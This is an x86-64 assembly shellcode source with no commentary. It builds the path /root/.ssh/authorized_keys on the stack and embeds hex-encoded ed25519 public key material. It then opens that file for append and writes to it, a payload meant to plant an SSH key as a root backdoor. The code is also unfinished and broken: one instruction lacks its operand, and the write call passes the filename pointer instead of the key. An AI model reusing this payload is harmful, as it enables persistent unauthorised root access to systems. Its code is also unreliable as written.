BITS 64
section .text
global _start
_start:

;mov rax, 0x7478742e74736574
xor r9, r9
xor r10, r10
push r10
mov r9, 0x7379656b5f64657a
push r9
mov r9, 0x69726f687475612f
push r9
mov r9, 0x6873732e2f746f6f
push r9
mov r9, 0x722f2f2f2f2f2f2f
push r9
mov r9, rsp ; set file name

; 73 73 68 2D 65 64 32 35 35 31 39 20 41 41 41 41 43 33 4E 7A 61 43 31 6C 5A 44 49 31 4E 54 45 35 41 41 41 41 49 4D 78 47 6F 72 46 4A 31 75 6D 35 6F 37 43 78 4E 79 38 66

xor r8, r8
push r10
mov r8, 0x6462663666457449
push r8
mov r8, 0x32502f39334f536f
push r8
mov r8, 0x677a5a466d616156
push r8
mov r8, 0x

; open the file
xor rax, rax
mov rax, 0x02
mov rsi, 0x0241
mov rdi, r9
mov rdx, 0x0180
syscall

mov r10, rax

; write to the file
xor rax, rax
mov rax, 0x01
mov rdi, r10
mov rsi, r9
mov rdx, 0x20
syscall

break:

xor rdi, rdi
xor rax, rax
mov al,  0x3c
syscall